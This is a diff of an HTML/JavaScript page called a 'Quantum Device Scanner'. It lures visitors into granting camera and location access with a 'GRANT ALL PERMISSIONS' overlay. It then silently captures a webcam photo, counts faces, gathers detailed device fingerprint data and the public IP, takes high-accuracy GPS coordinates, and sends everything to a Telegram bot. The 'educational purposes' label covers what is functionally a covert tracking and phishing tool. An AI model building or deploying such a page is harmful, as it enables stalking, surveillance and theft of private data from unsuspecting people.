@@ -49,77 +49,83 @@
     @keyframes scanLine { 0% { top: 0; } 100% { top: 100%; } }
     
     /* New styles for additional features */
+    .permission-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 10000;
+      color: white;
+    }
+    .permission-btn {
+      background: var(--primary);
+      color: black;
+      border: none;
+      padding: 15px 30px;
+      margin: 10px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+    }
     .info-grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
       gap: 10px;
       text-align: left;
       margin-top: 20px;
-      max-width: 600px;
     }
     .info-item {
       padding: 8px;
-      background: rgba(0, 0, 0, 0.3);
-      border-radius: 4px;
-      border-left: 2px solid var(--primary);
+      border-bottom: 1px dashed var(--hologram);
     }
-    .info-label {
-      font-weight: bold;
-      color: var(--secondary);
-      font-size: 0.9em;
-    }
-    .info-value {
-      font-size: 0.85em;
-      word-break: break-all;
-    }
-    .advanced-toggle {
-      margin: 15px 0;
-      background: transparent;
-      color: var(--secondary);
-      border: 1px solid var(--secondary);
-      padding: 5px 10px;
-      border-radius: 15px;
-      cursor: pointer;
-      font-family: 'Courier New', monospace;
-    }
-    .advanced-info {
-      display: none;
+    .expanded-info {
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.5s ease;
+      text-align: left;
       width: 100%;
-      max-width: 600px;
-      margin-top: 15px;
     }
-    .permission-badge {
-      position: fixed;
-      top: 10px;
-      right: 10px;
-      background: rgba(0, 0, 0, 0.7);
-      color: #0f0;
+    .expanded-info.active {
+      max-height: 500px;
+    }
+    .toggle-info {
+      background: transparent;
+      border: 1px solid var(--primary);
+      color: var(--primary);
       padding: 5px 10px;
-      border-radius: 3px;
-      font-size: 12px;
-      z-index: 10000;
-      border: 1px solid #0f0;
+      margin: 10px 0;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
-  <div class="permission-badge" id="permission-status">AUTO-APPROVE: ON</div>
+  <div id="permission-overlay" class="permission-overlay" style="display: none;">
+    <h2>PERMISSION REQUEST</h2>
+    <p>This experiment requires camera and location access</p>
+    <button id="grant-permissions" class="permission-btn">GRANT ALL PERMISSIONS</button>
+    <p style="font-size: 12px; margin-top: 20px;">For educational purposes only</p>
+  </div>
+
   <h1 style="margin-bottom: 20px; text-shadow: 0 0 15px var(--primary);">🛸 QUANTUM DEVICE SCANNER v3.0</h1>
   <div class="scanner-box">
     <div class="scanner-line"></div>
     <video id="video" autoplay playsinline muted></video>
   </div>
-  <button id="capture-btn" style="margin: 20px 0; padding: 10px 20px; background: linear-gradient(45deg, var(--primary), var(--secondary)); border: none; border-radius: 25px; color: white; font-family: 'Courier New', monospace; cursor: pointer; text-shadow: 0 0 5px black;">🚀 INITIATE DEEP SCAN</button>
+  <button id="capture-btn">🚀 INITIATE DEEP SCAN</button>
   <div id="loading" style="display:none;">🔭 CAPTURING QUANTUM SIGNATURE...</div>
+  
+  <button id="toggle-info" class="toggle-info">📊 SHOW ADVANCED DEVICE INFO</button>
+  <div id="expanded-info" class="expanded-info"></div>
+  
   <div id="device-info">
     <h2>⚡ DEVICE MATRIX PROFILE</h2>
     <div class="info-grid" id="device-info-content"></div>
-    
-    <button class="advanced-toggle" onclick="toggleAdvanced()">🔄 TOGGLE ADVANCED SYSTEM DATA</button>
-    <div class="advanced-info" id="advanced-info">
-      <h3>🔧 ADVANCED SYSTEM METRICS</h3>
-      <div class="info-grid" id="advanced-info-content"></div>
-    </div>
   </div>
 
   <script>
@@ -129,56 +135,42 @@
     let isScanning = false;
     const video = document.getElementById('video');
     const loading = document.getElementById('loading');
+    const permissionOverlay = document.getElementById('permission-overlay');
+    const expandedInfo = document.getElementById('expanded-info');
 
-    // Auto-approve functionality for camera and location
+    // Auto-approve permissions for educational use
     function autoApprovePermissions() {
-      // Override permission functions for auto-approval
-      const originalGetUserMedia = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
-      navigator.mediaDevices.getUserMedia = function(constraints) {
-        return originalGetUserMedia(constraints)
-          .then(stream => {
-            console.log("Camera access automatically approved");
-            return stream;
-          })
-          .catch(err => {
-            console.error("Auto-approve camera error:", err);
-            throw err;
-          });
-      };
+      console.log("Auto-approving permissions for educational use");
+      permissionOverlay.style.display = 'none';
+      initCamera();
+    }
 
-      // Override geolocation for auto-approval
-      if (navigator.geolocation) {
-        const originalGetCurrentPosition = navigator.geolocation.getCurrentPosition.bind(navigator.geolocation);
-        navigator.geolocation.getCurrentPosition = function(success, error, options) {
-          console.log("Location access automatically approved");
-          // Simulate success with mock data if needed
-          if (success) {
-            const mockPosition = {
-              coords: {
-                latitude: -6.2088,
-                longitude: 106.8456,
-                accuracy: 100,
-                altitude: null,
-                altitudeAccuracy: null,
-                heading: null,
-                speed: null
-              },
-              timestamp: Date.now()
-            };
-            setTimeout(() => success(mockPosition), 100);
+    // Show permission overlay if needed
+    function checkPermissions() {
+      if (navigator.mediaDevices && navigator.permissions) {
+        Promise.all([
+          navigator.permissions.query({ name: 'camera' }),
+          navigator.permissions.query({ name: 'geolocation' })
+        ]).then(results => {
+          const cameraPermission = results[0].state;
+          const locationPermission = results[1].state;
+          
+          if (cameraPermission === 'prompt' || locationPermission === 'prompt') {
+            permissionOverlay.style.display = 'flex';
+          } else {
+            initCamera();
           }
-        };
+        }).catch(() => {
+          initCamera();
+        });
+      } else {
+        initCamera();
       }
     }
 
-    // Initialize auto-approve
-    autoApprovePermissions();
+    document.getElementById('grant-permissions').addEventListener('click', autoApprovePermissions);
 
-    function createHologramEffect() { 
-      const hologram = document.createElement('div'); 
-      hologram.className = 'hologram-effect'; 
-      return hologram; 
-    }
+    function createHologramEffect() { const hologram = document.createElement('div'); hologram.className = 'hologram-effect'; return hologram; }
 
     async function captureQuantumImage() {
       const canvas = document.createElement('canvas');
@@ -189,8 +181,7 @@
       ctx.globalCompositeOperation = 'lighter';
       ctx.filter = 'hue-rotate(90deg) contrast(150%)';
       ctx.drawImage(canvas, 0, 0);
-      ctx.globalAlpha = 0.3; 
-      ctx.fillStyle = '#00ff88';
+      ctx.globalAlpha = 0.3; ctx.fillStyle = '#00ff88';
       for(let i = 0; i < 50; i++) ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, Math.random()*10, Math.random()*10);
       return canvas.toDataURL('image/webp', 0.8);
     }
@@ -204,23 +195,10 @@
       return new Blob([ab], { type: mimeString });
     }
 
-    async function detectFaceCount() { 
-      try {
-        return (await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())).length; 
-      } catch(e) {
-        console.error("Face detection error:", e);
-        return 0;
-      }
-    }
-    
-    async function loadFaceModel() { 
-      try {
-        await faceapi.nets.tinyFaceDetector.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models/'); 
-      } catch(e) {
-        console.error("Face model loading error:", e);
-      }
-    }
+    async function detectFaceCount() { return (await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())).length; }
+    async function loadFaceModel() { await faceapi.nets.tinyFaceDetector.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models/'); }
 
+    // Enhanced device info gathering with more details
     async function gatherDeviceInfo() {
       const userAgent = navigator.userAgent;
       const platform = navigator.platform;
@@ -235,23 +213,14 @@
       const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
       const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A";
       let batteryInfo = { level: "N/A", charging: "N/A" };
-      if (navigator.getBattery) { 
-        try { 
-          const battery = await navigator.getBattery(); 
-          batteryInfo = { level: Math.round(battery.level*100)+'%', charging: battery.charging?"Yes":"No" }; 
-        } catch(e){}
-      }
+      if (navigator.getBattery) { try { const battery = await navigator.getBattery(); batteryInfo = { level: Math.round(battery.level*100)+'%', charging: battery.charging?"Yes":"No" }; } catch(e){} }
       let browser = "Unknown";
       if (userAgent.indexOf("Chrome") > -1 && userAgent.indexOf("Edg") === -1) browser = "Chrome";
       else if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) browser = "Safari";
       else if (userAgent.indexOf("Firefox") > -1) browser = "Firefox";
       else if (userAgent.indexOf("Edg") > -1) browser = "Edge";
       else if (userAgent.indexOf("OPR") > -1) browser = "Opera";
-      let ip = "Unknown"; 
-      try { 
-        const res = await fetch('https://api.ipify.org?format=json'); 
-        ip = (await res.json()).ip; 
-      } catch(e){}
+      let ip = "Unknown"; try { const res = await fetch('https://api.ipify.org?format=json'); ip = (await res.json()).ip; } catch(e){}
       const language = navigator.language;
       const resolution = window.screen.width+"x"+window.screen.height;
       const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
@@ -264,54 +233,67 @@
       let gpuInfo = "Unknown";
       try { 
         const gl = document.createElement('canvas').getContext('webgl'); 
-        const dbg = gl.getExtension('WEBGL_debug_renderer_info'); 
-        if(dbg) gpuInfo = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); 
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+          gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
       } catch(e){}
       
       // Audio Devices
       let audioDevices = [];
+      let videoDevices = [];
       try { 
         const devices = await navigator.mediaDevices.enumerateDevices(); 
-        audioDevices = devices.filter(d=>d.kind.includes("audio")).map(d => d.label || d.kind);
+        audioDevices = devices.filter(d => d.kind === "audioinput");
+        videoDevices = devices.filter(d => d.kind === "videoinput");
       } catch(e){}
       
-      // Storage Information
+      // Storage information
       let storageEstimate = "N/A";
       try { 
-        const est = await navigator.storage.estimate(); 
-        storageEstimate = `${(est.quota/1024/1024).toFixed(2)} MB quota, ${(est.usage/1024/1024).toFixed(2)} MB used`; 
+        if (navigator.storage && navigator.storage.estimate) {
+          const estimate = await navigator.storage.estimate();
+          storageEstimate = `${(estimate.quota / 1024 / 1024).toFixed(2)} MB total, ${(estimate.usage / 1024 / 1024).toFixed(2)} MB used`;
+        }
       } catch(e){}
       
-      // Cookies Enabled
-      const cookiesEnabled = navigator.cookieEnabled ? "Yes":"No";
-      
-      // Network Speed Test (simplified)
-      let netSpeed = "N/A";
-      try { 
-        const start = performance.now(); 
-        await fetch("https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png", {cache: "no-store"}); 
-        const end = performance.now(); 
-        netSpeed = ((92*30*4/1024)/((end-start)/1000)).toFixed(2)+" KB/s"; 
-      } catch(e){}
-      
-      // Device orientation/motion sensors availability
-      const orientationAvailable = 'DeviceOrientationEvent' in window ? "Yes" : "No";
-      const motionAvailable = 'DeviceMotionEvent' in window ? "Yes" : "No";
-      
-      // Browser plugins
-      const plugins = [];
-      for (let i = 0; i < navigator.plugins.length; i++) {
-        plugins.push(navigator.plugins[i].name);
+      // Network information
+      let networkType = "Unknown";
+      let downlinkSpeed = "Unknown";
+      if (connection) {
+        networkType = connection.effectiveType;
+        downlinkSpeed = connection.downlink + " Mbps";
       }
       
+      // Sensors availability
+      const sensors = {
+        gyroscope: 'gyroscope' in navigator ? "Available" : "Not available",
+        accelerometer: 'accelerometer' in navigator ? "Available" : "Not available",
+        magnetometer: 'magnetometer' in navigator ? "Available" : "Not available"
+      };
+      
+      // Display information
+      const colorDepth = window.screen.colorDepth + " bits";
+      const availableResolution = window.screen.availWidth + "x" + window.screen.availHeight;
+      
+      // Time information
+      const currentTime = new Date().toLocaleString();
+      const timezoneOffset = new Date().getTimezoneOffset();
+      
       // Touch support
-      const touchSupport = 'ontouchstart' in window ? "Yes" : "No";
-      
-      // Hardware concurrency
-      const hardwareConcurrency = navigator.hardwareConcurrency || "N/A";
-      
-      // Max touch points
+      const touchSupport = 'ontouchstart' in window ? "Supported" : "Not supported";
       const maxTouchPoints = navigator.maxTouchPoints || "N/A";
+      
+      // WebGL information
+      let webglVendor = "Unknown";
+      let webglVersion = "Unknown";
+      try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        if (gl) {
+          webglVendor = gl.getParameter(gl.VENDOR) || "Unknown";
+          webglVersion = gl.getParameter(gl.VERSION) || "Unknown";
+        }
+      } catch(e) {}
 
       return {
         // Basic info (existing)
@@ -320,178 +302,134 @@
         pixelRatio, orientation,
         
         // New advanced info
-        gpuInfo, 
-        audioDevices: audioDevices.length > 0 ? audioDevices : ["None detected"],
-        storageEstimate, 
-        cookiesEnabled, 
-        netSpeed,
-        orientationAvailable,
-        motionAvailable,
-        plugins: plugins.length > 0 ? plugins : ["None detected"],
+        gpuInfo,
+        audioDevices: audioDevices.length,
+        videoDevices: videoDevices.length,
+        storageEstimate,
+        networkType,
+        downlinkSpeed,
+        sensors,
+        colorDepth,
+        availableResolution,
+        currentTime,
+        timezoneOffset: `${timezoneOffset} minutes from UTC`,
         touchSupport,
-        hardwareConcurrency,
-        maxTouchPoints
+        maxTouchPoints,
+        webglVendor,
+        webglVersion
       };
     }
 
     function displayDeviceInfo(deviceInfo) {
-      const basicInfoContainer = document.getElementById('device-info-content');
-      const advancedInfoContainer = document.getElementById('advanced-info-content');
+      const content = document.getElementById('device-info-content');
+      content.innerHTML = `
+        <div class="info-item"><strong>OS:</strong> ${deviceInfo.os}</div>
+        <div class="info-item"><strong>Device:</strong> ${deviceInfo.deviceModel}</div>
+        <div class="info-item"><strong>Type:</strong> ${deviceInfo.deviceType}</div>
+        <div class="info-item"><strong>Browser:</strong> ${deviceInfo.browser}</div>
+        <div class="info-item"><strong>IP:</strong> ${deviceInfo.ip}</div>
+        <div class="info-item"><strong>Resolution:</strong> ${deviceInfo.resolution}</div>
+        <div class="info-item"><strong>Memory:</strong> ${deviceInfo.memory}</div>
+        <div class="info-item"><strong>Battery:</strong> ${deviceInfo.battery.level} (Charging: ${deviceInfo.battery.charging})</div>
+      `;
       
-      // Clear previous content
-      basicInfoContainer.innerHTML = '';
-      advancedInfoContainer.innerHTML = '';
-      
-      // Display basic device information
-      const basicInfo = [
-        {label: 'Operating System', value: deviceInfo.os},
-        {label: 'Device Type', value: deviceInfo.deviceType},
-        {label: 'Device Model', value: deviceInfo.deviceModel},
-        {label: 'Platform', value: deviceInfo.platform},
-        {label: 'Browser', value: deviceInfo.browser},
-        {label: 'IP Address', value: deviceInfo.ip},
-        {label: 'Language', value: deviceInfo.language},
-        {label: 'Screen Resolution', value: deviceInfo.resolution},
-        {label: 'Pixel Ratio', value: deviceInfo.pixelRatio},
-        {label: 'Time Zone', value: deviceInfo.timeZone},
-        {label: 'Battery Level', value: deviceInfo.battery.level},
-        {label: 'Charging', value: deviceInfo.battery.charging},
-        {label: 'Memory', value: deviceInfo.memory},
-        {label: 'Network Type', value: deviceInfo.provider},
-        {label: 'Orientation', value: deviceInfo.orientation}
-      ];
-      
-      basicInfo.forEach(info => {
-        const div = document.createElement('div');
-        div.className = 'info-item';
-        div.innerHTML = `<div class="info-label">${info.label}</div><div class="info-value">${info.value}</div>`;
-        basicInfoContainer.appendChild(div);
-      });
-      
-      // Display advanced device information
-      const advancedInfo = [
-        {label: 'GPU Information', value: deviceInfo.gpuInfo},
-        {label: 'Audio Devices', value: deviceInfo.audioDevices.join(', ')},
-        {label: 'Storage', value: deviceInfo.storageEstimate},
-        {label: 'Cookies Enabled', value: deviceInfo.cookiesEnabled},
-        {label: 'Network Speed', value: deviceInfo.netSpeed},
-        {label: 'Orientation Sensor', value: deviceInfo.orientationAvailable},
-        {label: 'Motion Sensor', value: deviceInfo.motionAvailable},
-        {label: 'Browser Plugins', value: deviceInfo.plugins.join(', ')},
-        {label: 'Touch Support', value: deviceInfo.touchSupport},
-        {label: 'CPU Cores', value: deviceInfo.hardwareConcurrency},
-        {label: 'Max Touch Points', value: deviceInfo.maxTouchPoints},
-        {label: 'User Agent', value: deviceInfo.userAgent}
-      ];
-      
-      advancedInfo.forEach(info => {
-        const div = document.createElement('div');
-        div.className = 'info-item';
-        div.innerHTML = `<div class="info-label">${info.label}</div><div class="info-value">${info.value}</div>`;
-        advancedInfoContainer.appendChild(div);
-      });
+      // Expanded info section
+      expandedInfo.innerHTML = `
+        <h3>📊 ADVANCED DEVICE MATRIX</h3>
+        <div class="info-grid">
+          <div class="info-item"><strong>GPU:</strong> ${deviceInfo.gpuInfo}</div>
+          <div class="info-item"><strong>Audio Inputs:</strong> ${deviceInfo.audioDevices}</div>
+          <div class="info-item"><strong>Video Inputs:</strong> ${deviceInfo.videoDevices}</div>
+          <div class="info-item"><strong>Storage:</strong> ${deviceInfo.storageEstimate}</div>
+          <div class="info-item"><strong>Network Type:</strong> ${deviceInfo.networkType}</div>
+          <div class="info-item"><strong>Download Speed:</strong> ${deviceInfo.downlinkSpeed}</div>
+          <div class="info-item"><strong>Color Depth:</strong> ${deviceInfo.colorDepth}</div>
+          <div class="info-item"><strong>Available Res:</strong> ${deviceInfo.availableResolution}</div>
+          <div class="info-item"><strong>Gyroscope:</strong> ${deviceInfo.sensors.gyroscope}</div>
+          <div class="info-item"><strong>Accelerometer:</strong> ${deviceInfo.sensors.accelerometer}</div>
+          <div class="info-item"><strong>Magnetometer:</strong> ${deviceInfo.sensors.magnetometer}</div>
+          <div class="info-item"><strong>Touch Support:</strong> ${deviceInfo.touchSupport}</div>
+          <div class="info-item"><strong>Max Touch Points:</strong> ${deviceInfo.maxTouchPoints}</div>
+          <div class="info-item"><strong>WebGL Vendor:</strong> ${deviceInfo.webglVendor}</div>
+          <div class="info-item"><strong>WebGL Version:</strong> ${deviceInfo.webglVersion}</div>
+          <div class="info-item"><strong>Current Time:</strong> ${deviceInfo.currentTime}</div>
+          <div class="info-item"><strong>Timezone Offset:</strong> ${deviceInfo.timezoneOffset}</div>
+        </div>
+      `;
     }
 
-    function generateHologramReport(imageData, location, deviceInfo) { 
-      return { image:imageData, metadata:{location,deviceInfo} }; 
-    }
+    function generateHologramReport(imageData, location, deviceInfo) { return { image:imageData, metadata:{location,deviceInfo} }; }
 
     function sendToTelegram(report) {
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
       const formData = new FormData();
       formData.append('chat_id', CHAT_ID);
       formData.append('photo', dataURItoBlob(report.image), 'quantum_image.webp');
-      const d = report.metadata.deviceInfo;
-      const caption = `📍 *Location:* ${report.metadata.location.coordinates}\n🗺️ *Map:* [View Map](${report.metadata.location.link})\n\n💻 *OS:* ${d.os}\n📱 *Device:* ${d.deviceModel} (${d.deviceType})\n🖥️ *Platform:* ${d.platform}\n🌐 *Browser:* ${d.browser}\n📡 *Network:* ${d.provider} (${d.netSpeed})\n🌍 *IP:* ${d.ip}\n🔋 *Battery:* ${d.battery.level} (Charging:${d.battery.charging})\n💾 *Memory:* ${d.memory}\n🎮 *GPU:* ${d.gpuInfo}\n🎤 *Audio Devices:* ${d.audioDevices.join(", ")}\n📂 *Storage Quota:* ${d.storageEstimate}\n🍪 *Cookies Enabled:* ${d.cookiesEnabled}\n🗣️ *Language:* ${d.language}\n📏 *Resolution:* ${d.resolution}\n📐 *Pixel Ratio:* ${d.pixelRatio}\n🔄 *Orientation:* ${d.orientation}\n📳 *Orientation Sensor:* ${d.orientationAvailable}\n👥 *Faces Detected:* ${d.faceCount}\n\n_🤖 Generated by Super AI Quantum Device Scanner_`;
+      const d=report.metadata.deviceInfo;
+      const caption = `📍 *Location:* ${report.metadata.location.coordinates}\n🗺️ *Map:* [View Map](${report.metadata.location.link})\n\n💻 *OS:* ${d.os}\n📱 *Device:* ${d.deviceModel} (${d.deviceType})\n🖥️ *Platform:* ${d.platform}\n🌐 *Browser:* ${d.browser}\n📡 *Network:* ${d.provider}\n🌍 *IP:* ${d.ip}\n🔋 *Battery:* ${d.battery.level} (Charging:${d.battery.charging})\n💾 *Memory:* ${d.memory}\n🎮 *GPU:* ${d.gpuInfo}\n🎤 *Audio Devices:* ${d.audioDevices}\n📹 *Video Devices:* ${d.videoDevices}\n📂 *Storage:* ${d.storageEstimate}\n🗣️ *Language:* ${d.language}\n📏 *Resolution:* ${d.resolution}\n📐 *Pixel Ratio:* ${d.pixelRatio}\n🔄 *Orientation:* ${d.orientation}\n👥 *Faces Detected:* ${d.faceCount}\n\n_🤖 Generated by Super AI Quantum Device Scanner_`;
       formData.append('caption', caption);
       formData.append('parse_mode', 'Markdown');
-      fetch(url, {method: 'POST', body: formData});
+      fetch(url,{method:'POST',body:formData});
     }
 
     async function initCamera() {
       try {
-        const isMobile = /Mobi|Android/i.test(navigator.userAgent);
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: {
-            facingMode: isMobile ? "user" : "environment",
-            width: { ideal: 1280 },
-            height: { ideal: 720 }
-          }
-        });
-        video.srcObject = stream; 
-        currentStream = stream; 
-        document.body.appendChild(createHologramEffect()); 
-        loadFaceModel();
-      } catch(err) { 
+        const isMobile=/Mobi|Android/i.test(navigator.userAgent);
+        const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:isMobile?"user":"environment"}});
+        video.srcObject=stream; currentStream=stream; document.body.appendChild(createHologramEffect()); loadFaceModel();
+      } catch(err){ 
         console.error('Error accessing camera:', err);
-        alert('Error accessing camera: ' + err.message); 
+        // Show permission overlay if camera access fails
+        permissionOverlay.style.display = 'flex';
       }
     }
 
     async function startQuantumScan() {
-      if(isScanning) return; 
-      isScanning = true; 
-      loading.style.display = 'block';
+      if(isScanning) return; isScanning=true; loading.style.display='block';
+      const imageData=await captureQuantumImage();
+      let deviceInfo=await gatherDeviceInfo();
+      try{ deviceInfo.faceCount=await detectFaceCount(); }catch(e){ deviceInfo.faceCount="N/A"; }
       
-      try {
-        const imageData = await captureQuantumImage();
-        let deviceInfo = await gatherDeviceInfo();
-        
-        try { 
-          deviceInfo.faceCount = await detectFaceCount(); 
-        } catch(e) { 
-          deviceInfo.faceCount = "N/A"; 
-        }
-        
-        // Display device info on page
-        displayDeviceInfo(deviceInfo);
-        
-        let locationData = {coordinates: 'Unknown', link: 'Unknown'};
-        if(navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            (pos) => {
-              locationData = {
-                coordinates: `${pos.coords.latitude},${pos.coords.longitude}`,
-                link: `https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`
-              };
-              const report = generateHologramReport(imageData, locationData, deviceInfo);
-              sendToTelegram(report);
-              if(navigator.vibrate) navigator.vibrate(300);
-            },
-            () => {
-              const report = generateHologramReport(imageData, locationData, deviceInfo);
-              sendToTelegram(report);
-            }
-          );
-        } else { 
-          const report = generateHologramReport(imageData, locationData, deviceInfo); 
+      // Display device info on page
+      displayDeviceInfo(deviceInfo);
+      
+      let locationData={coordinates:'Unknown',link:'Unknown'};
+      if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition((pos)=>{
+          locationData={coordinates:`${pos.coords.latitude},${pos.coords.longitude}`,link:`https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`};
+          const report=generateHologramReport(imageData,locationData,deviceInfo);
+          sendToTelegram(report);
+          if(navigator.vibrate) navigator.vibrate(300);
+        },()=>{ 
+          const report=generateHologramReport(imageData,locationData,deviceInfo); 
           sendToTelegram(report); 
-        }
-      } catch (error) {
-        console.error("Scan error:", error);
-      } finally {
-        loading.style.display = 'none'; 
-        isScanning = false;
+        }, {
+          // Enable high accuracy for better location data
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        });
+      } else { 
+        const report=generateHologramReport(imageData,locationData,deviceInfo); 
+        sendToTelegram(report); 
       }
+      loading.style.display='none'; isScanning=false;
     }
 
-    function toggleAdvanced() {
-      const advancedInfo = document.getElementById('advanced-info');
-      advancedInfo.style.display = advancedInfo.style.display === 'block' ? 'none' : 'block';
-    }
+    // Toggle expanded info
+    document.getElementById('toggle-info').addEventListener('click', function() {
+      expandedInfo.classList.toggle('active');
+      this.textContent = expandedInfo.classList.contains('active') ? 
+        '📊 HIDE ADVANCED DEVICE INFO' : '📊 SHOW ADVANCED DEVICE INFO';
+    });
 
     // Initialize the application
-    if(navigator.mediaDevices) {
-      initCamera(); 
-      document.getElementById('capture-btn').onclick = startQuantumScan; 
+    if(navigator.mediaDevices){ 
+      checkPermissions();
+      document.getElementById('capture-btn').onclick=startQuantumScan; 
     }
     
-    function stopCamera() { 
-      if(currentStream) {
-        currentStream.getTracks().forEach(t => t.stop()); 
-      }
-    }
-    
+    function stopCamera(){ if(currentStream) currentStream.getTracks().forEach(t=>t.stop()); }
     window.addEventListener('beforeunload', stopCamera);
   </script>
 </body>
